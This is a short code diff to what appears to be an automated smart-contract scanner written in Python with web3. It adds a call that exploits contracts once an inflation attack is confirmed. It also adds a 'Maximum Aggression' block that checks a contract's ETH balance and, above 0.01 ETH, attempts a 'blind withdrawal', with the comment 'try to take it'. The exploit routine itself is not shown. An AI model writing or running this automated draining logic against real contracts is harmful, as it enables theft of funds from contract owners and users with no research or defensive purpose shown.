@@ -438,6 +438,7 @@ def process_contract(w3: Web3, addr: str) -> None:
                                      "type": "confirmed_inflation_attack",
                                      "data": poc_res
                                  })
+                                 execute_cautious_exploit(w3, addr, "confirmed_inflation_attack", poc_res)
                             else:
                                  print(f"[INFO] Inflation attack verification failed or inconclusive.", flush=True)
                         except Exception as e:
@@ -559,6 +560,17 @@ def process_contract(w3: Web3, addr: str) -> None:
                 # we skip this entire block to avoid "Watch" logs.
                 try:
                     pass
+                except Exception:
+                    pass
+            
+            # Universal Withdrawal Attempt (Maximum Aggression)
+            # If we haven't found anything specific yet, but the contract has money, try to take it.
+            if not findings and not ONLY_FOT_MODE:
+                try:
+                    balance_wei = w3.eth.get_balance(addr)
+                    if balance_wei > 10**16: # > 0.01 ETH
+                        print(f"[MAXIMUM] Contract {addr} has {balance_wei/10**18:.4f} ETH. Attempting Blind Withdrawal...", flush=True)
+                        execute_cautious_exploit(w3, addr, "blind_withdrawal", {"balance_wei": balance_wei})
                 except Exception:
                     pass
             
